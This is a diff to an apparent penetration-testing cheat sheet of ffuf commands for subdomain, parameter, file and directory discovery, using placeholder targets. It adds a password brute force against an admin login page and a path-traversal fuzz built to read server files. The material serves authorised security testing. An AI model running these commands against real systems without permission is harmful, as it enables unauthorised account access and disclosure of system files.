@@ -7,9 +7,24 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 # decrease thread (prevent DoS; default 40)
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.<TLD> -fs <SIZE> -t <THREADS>
 
-# GET
+# GET parameter discovery
 curl -s http://<URL>?FUZZ=ls+-lah | wc -c
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<URL>?FUZZ=test_value -fs <SIZE>
 
+# parameter value fuzz
+ffuf -w /usr/share/seclists/Usernames/cirt-default-usernames.txt -fc 404 -u http://<URL>?<PARAM>=FUZZ -enc FUZZ:urlencode
+
 # POST
-ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -X POST -d "username=admin\&password=FUZZ" -u https://<URL>/login.php -fc 401
+
+# file discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -fc 301,404,403 -u http://<URL>/FUZZ
+
+# directory discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403,301 -u <URL>
+
+# wordlists
+/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+# LFI
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404 -u <LFI_URL>=../../../../../../../../../../../../FUZZ
